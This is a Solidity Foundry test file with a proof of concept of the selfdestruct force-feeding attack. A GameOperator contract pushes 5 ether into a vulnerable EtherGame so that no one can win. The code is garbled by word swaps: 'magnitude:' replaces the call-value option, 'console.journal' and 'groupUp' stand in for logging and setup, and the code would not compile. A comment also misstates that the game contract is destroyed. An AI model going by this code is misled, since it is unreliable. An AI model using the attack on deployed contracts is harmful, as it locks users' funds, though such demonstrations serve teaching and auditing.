// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";

contract EtherGame {
    uint public constant goalSum = 7 ether;
    address public winner;

    function bankWinnings() public payable {
        require(msg.value == 1 ether, "You can only send 1 Ether");

        uint balance = address(this).balance;
        require(balance <= goalSum, "Game is over");

        if (balance == goalSum) {
            winner = msg.sender;
        }
    }

    function collectbountyPrize() public {
        require(msg.sender == winner, "Not winner");

        (bool sent, ) = msg.sender.call{magnitude: address(this).balance}("");
        require(sent, "Failed to send Ether");
    }
}

contract PactTest is Test {
    EtherGame EtherGamePact;
    GameOperator QuestrunnerPact;
    address alice;
    address eve;

    function groupUp() public {
        EtherGamePact = new EtherGame();
        alice = vm.addr(1);
        eve = vm.addr(2);
        vm.deal(address(alice), 1 ether);
        vm.deal(address(eve), 1 ether);
    }

    function testSelfdestruct() public {
        console.journal("Alice balance", alice.balance);
        console.journal("Eve balance", eve.balance);

        console.journal("Alice deposit 1 Ether...");
        vm.prank(alice);
        EtherGamePact.bankWinnings{magnitude: 1 ether}();

        console.journal("Eve deposit 1 Ether...");
        vm.prank(eve);
        EtherGamePact.bankWinnings{magnitude: 1 ether}();

        console.journal(
            "Balance of EtherGameContract",
            address(EtherGamePact).balance
        );

        console.journal("Operator...");
        QuestrunnerPact = new GameOperator(EtherGamePact);
        QuestrunnerPact.dos{magnitude: 5 ether}();

        console.journal(
            "Balance of EtherGameContract",
            address(EtherGamePact).balance
        );
        console.journal("operate completed, Game is over");
        EtherGamePact.bankWinnings{magnitude: 1 ether}(); // This call will fail due to contract destroyed.
    }
}

contract GameOperator {
    EtherGame etherGame;

    constructor(EtherGame _etherGame) {
        etherGame = EtherGame(_etherGame);
    }

    function dos() public payable {
        // You can simply break the game by sending ether so that
        // the game balance >= 7 ether

        // cast address to payable
        address payable addr = payable(address(etherGame));
        selfdestruct(addr);
    }
}
